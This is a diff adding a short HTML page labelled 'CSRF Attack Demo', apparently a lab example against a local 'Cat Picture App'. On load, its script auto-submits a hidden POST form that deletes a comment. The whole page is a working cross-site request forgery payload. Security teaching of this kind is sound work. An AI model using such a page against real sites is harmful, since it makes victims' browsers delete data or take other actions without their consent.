@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <h2>Malicious CSRF Page</h2>
+    <p>When this page loads, it will automatically submit a form to delete a comment on the Cat Picture App.</p>
+    <form action="http://localhost:8080/deleteComment" method="post" id="csrfForm">
+        <input type="hidden" name="commentId" value="1" />
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
